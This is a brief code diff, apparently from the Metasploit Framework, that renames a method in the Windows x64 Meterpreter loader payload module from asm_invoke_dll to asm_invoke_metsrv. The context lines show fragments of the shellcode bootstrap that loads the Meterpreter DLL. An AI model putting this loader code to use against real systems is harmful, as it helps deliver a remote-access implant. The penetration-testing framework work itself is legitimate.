@@ -34,7 +34,7 @@ module Payload::Windows::MeterpreterLoader_x64
       ))
   end
 
-  def asm_invoke_dll(opts={})
+  def asm_invoke_metsrv(opts={})
     asm = %Q^
         ; prologue
           db 0x4d, 0x5a         ; 'MZ' = "pop r10"
@@ -70,7 +70,7 @@ module Payload::Windows::MeterpreterLoader_x64
       :length     => dll.length
     }
 
-    asm = asm_invoke_dll(asm_opts)
+    asm = asm_invoke_metsrv(asm_opts)
 
     # generate the bootstrap asm
     bootstrap = Metasm::Shellcode.assemble(Metasm::X64.new, asm).encode_string
